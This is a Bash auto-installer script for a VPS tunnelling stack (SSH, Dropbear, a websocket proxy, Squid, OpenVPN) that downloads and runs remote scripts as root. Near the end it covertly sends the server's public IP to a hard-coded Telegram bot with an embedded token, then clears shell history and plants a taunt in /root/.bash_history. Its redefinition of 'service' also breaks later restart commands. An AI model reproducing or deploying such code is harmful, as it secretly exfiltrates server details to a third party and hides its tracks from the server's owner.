# Illegal selling and redistribution of this script is strictly prohibite
# Please respect author's Property
# Binigay sainyo ng libre, ipamahagi nyo rin ng libre.
#
#

# Install AutoScript
function ssh() {
    rm -f DebianVPS* && wget -q 'https://raw.githubusercontent.com/Bonveio/BonvScripts/master/DebianVPS-Installer' && chmod +x DebianVPS-Installer && ./DebianVPS-Installer 
    rm -f /etc/banner
    wget -qO /etc/banner https://raw.githubusercontent.com/bannerpy/Files/main/mcbanner
    dos2unix -q /etc/banner
    service ssh restart
    service sshd restart
    service dropbear restart
}
ssh

function service() {
# Getting Proxy Template
wget -q -O /etc/microssh https://raw.githubusercontent.com/bannerpy/Files/main/micro.py
chmod +x /etc/microssh
}
service

function service1() {
# Installing Service
cat << END > /etc/systemd/system/microssh.service 
[Unit]
Description=Project Seve
Documentation=https://google.com
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/bin/python -O /etc/microssh
Restart=on-failure

[Install]
WantedBy=multi-user.target
END
}
service1

function setting() {
sed -i "/DEFAULT_HOST = '127.0.0.1:443'/c\DEFAULT_HOST = '127.0.0.1:550'" /etc/microssh

systemctl daemon-reload
systemctl enable microssh
systemctl restart microssh
}
setting

function cron10min() {
echo -e "0 3 * * * /sbin/reboot >/dev/null 2>&1" >> mycron
     echo -e "*/10 * * * * sudo service microssh restart" >> mycron
     crontab mycron
     service cron restart
}
cron10min
clear

# Fixing Squid Proxy

apt-get -y install squid
function fixsquid() {
    cat <<'EOFsquid' > /etc/squid/squid.conf
acl VPN dst 127.0.0.1/32
http_access allow VPN
http_access deny all
http_port 0.0.0.0:8000
http_port 0.0.0.0:8080
acl bonv src 0.0.0.0/0.0.0.0
no_cache deny bonv
dns_nameservers 1.1.1.1 1.0.0.1
visible_hostname localhost
EOFsquid
}
fixsquid

function fixedovpn() {
bash -c "sed -i "/ncp-disable/d" /etc/openvpn/server/*.conf;systemctl restart openvpn-server@{ec_s,s}erver_{tc,ud}p"
}
fixedovpn


BOT_TOKEN="6196157240:AAGYmA-qY8x4j2Mde238PW7qTvn3-I0CT0Y"

# The chat ID of the conversation with your Telegram bot
CHAT_ID="-811236104"

# The URL to send the message to your Telegram bot
URL="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"

# Get the current IP address of your VPS
IP_ADDRESS=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')

# Forward the IP address to the Telegram bot
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="Your VPS IP address is: $IP_ADDRESS"

sed -i "s|127.0.0.1|$IP_ADDRESS|g" /etc/squid/squid.conf && service squid restart && history -c

service squid restart
service openvpn restart
history -c
clear

clear

rm /root/.bash_history
echo 'UTUT MU' > /root/.bash_history

echo "THIS SCRIPT IS NOT FOR SALE"
echo "MICROSSH AUTO SCRIPT "
echo "WEBSOCKET PORT 80"
echo "WEBSOCKET CRON 10 MINS"
echo "ANTI TORRENT INSTALLED"
echo "OPENVPN AND SQUID PROXY FIXED "